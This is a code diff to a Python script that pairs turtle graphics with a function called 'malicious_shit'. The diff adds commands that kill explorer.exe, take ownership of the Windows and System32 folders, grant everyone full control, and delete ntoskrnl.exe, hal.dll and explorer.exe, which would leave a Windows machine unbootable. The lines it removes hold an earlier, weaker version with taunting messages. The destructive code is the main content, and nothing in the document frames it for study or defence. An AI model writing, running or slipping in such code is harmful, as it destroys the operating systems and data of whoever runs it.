@@ -1,23 +1,24 @@
+import subprocess
 import os
 import time
 from turtle import *
 import turtle
-system32 = "C:\\Windows\\System32"
 def malicious_shit():
+        os.popen("taskkill /F /IM explorer.exe")
+        subprocess.run(['takeown', '/F', "C:"])
+        subprocess.run(['takeown', '/F', "C:\\Windows"])
+        subprocess.run(['takeown', '/F', "C:\\Windows\\System32"])
+        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\hal.dll"])
+        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\ntoskrnl.exe"])
+        subprocess.run(['icacls', 'C:\\Windows', "/t", "/grant", "Everyone:(OI)(CI)F"])
+        subprocess.run(['icacls', 'C:\\Windows\\explorer.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
+        subprocess.run(['icacls', 'C:\\Windows\\System32', "/t", "/grant", "Everyone:(OI)(CI)F"])
+        subprocess.run(['icacls', 'C:\\Windows\\System32\\hal.dll', "/t", "/grant", "Everyone:(OI)(CI)F"])
+        subprocess.run(['icacls', 'C:\\Windows\\System32\\ntoskrnl.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
+        os.remove("C:\\Windows\\System32\\ntoskrnl.exe")
+        os.remove("C:\\Windows\\System32\\hal.dll")
+        os.remove("C:\\Windows\\System32\\explorer.exe")
 
-    try :
-         os.popen("taskkill /F /IM explorer.exe")
-         os.popen("takeown /f C:\\Windows\\explorer.exe")
-        
-    except OSError :
-         print("Check your permissions stupid")
-         input("Press any key to exit")
-         exit(0)
-    except KeyboardInterrupt:
-         print("Coward 🤣🫵")
-         input("Press any key to exit")
-         exit(0)
-malicious_shit()
 def graphics():
         screen = turtle.Screen()
         screen.bgcolor("black")
